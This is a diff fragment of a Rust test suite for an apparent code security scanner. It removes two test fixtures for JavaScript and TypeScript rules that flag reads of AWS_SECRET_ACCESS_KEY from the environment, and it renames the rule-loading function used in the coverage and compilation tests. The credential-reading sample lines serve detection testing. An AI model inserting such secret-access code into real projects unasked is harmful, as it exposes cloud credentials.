-        rule_id: "GD_THREAT_RUNTIME_ENVIRONMENT_READ_JS",
-        file: "case.js",
-        source: "process.env[\"AWS_SECRET_ACCESS_KEY\"];\n",
-    },
-    Case {
-        rule_id: "GD_THREAT_RUNTIME_ENVIRONMENT_READ_TS",
-        file: "case.ts",
-        source: "process.env[\"AWS_SECRET_ACCESS_KEY\"];\n",
     },
 ];
 
 #[test]
 fn every_built_in_rule_has_a_test_case() {
-    let all_rules = rules::built_in_rules();
+    let all_rules = rules::default_rules();
     let rule_ids: std::collections::HashSet<&str> =
         all_rules.iter().map(|rule| rule.id.as_str()).collect();
     let case_ids: std::collections::HashSet<&str> = CASES.iter().map(|case| case.rule_id).collect();
@@ -494,7 +767,7 @@ fn every_built_in_rule_has_a_test_case() {
 
 #[test]
 fn every_rule_matches_its_fixture() {
-    let all_rules = rules::built_in_rules();
+    let all_rules = rules::default_rules();
     for case in CASES {
         let rule: &Rule = all_rules
             .iter()
@@ -541,5 +814,5 @@ fn assert_language_extension(rule: &Rule, case: &Case) {
 
 #[test]
 fn every_rule_compiles() {
-    scanner::validate_rules(&rules::built_in_rules()).unwrap();
+    scanner::validate_rules(&rules::default_rules()).unwrap();
 }
